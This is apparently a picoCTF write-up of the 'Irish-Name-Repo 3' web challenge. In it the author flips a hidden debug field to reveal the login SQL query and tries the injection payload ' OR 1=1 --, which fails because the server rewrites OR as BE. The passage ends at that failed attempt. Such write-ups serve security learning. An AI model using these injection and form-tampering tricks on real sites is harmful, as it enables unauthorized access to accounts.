# PicoCTF - Irish-Name-Repo 3 (Web exploitation)

## Description
There is a secure website running at https://jupiter.challenges.picoctf.org/problem/54253/ (link) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!

## Provided
None

## Initial Attempts

### 1. Trying admin login
Initially, I went to the admin login page where the password input is located. I tried simple inputs such as `123` and `admin`. However, the output was always:
   ```bash
   Login failed.
   ```
   So I knew the form was working, but I could not tell how my input was being used.

### 2. Finding debug line
   While I was carefully looking at `login.html`, I found this line:
   ```bash
   <input type="hidden" name="debug" value="0">
   ```
   This seems to be a debugging mode with value set to `0`. I tried:
   ```bash
    <input type="hidden" name="debug" value="1">
   ```
   and submitted `123` as the password. The output was:
   ```bash
   password: 123
    SQL query: SELECT * FROM admin where password = '123'
    Login failed.
   ```
   This revealed exactly how my input was being used inside the SQL query.

### 3. Attempting SQL Injection
   With debug output enabled, I realized this was likely an SQL injection challenge. I tried the classic payload:
   ```bash
   ` OR 1=1 --
   ```
   This should generate:
   ```bash
   SELECT * FROM admin where password = '' OR 1=1 --'
   ```
   This query would normally return all rows since 1=1 is always true.
   ```bash
   password: ' OR 1=1 --
    SQL query: SELECT * FROM admin where password = '' BE 1=1 --'
   ```
  At this moment I had no idea why it failed. Later I noticed that the server was replacing the keyword OR with BE, which is a form of input filtering. Because of this, my injection attempt did not work as intended.
   
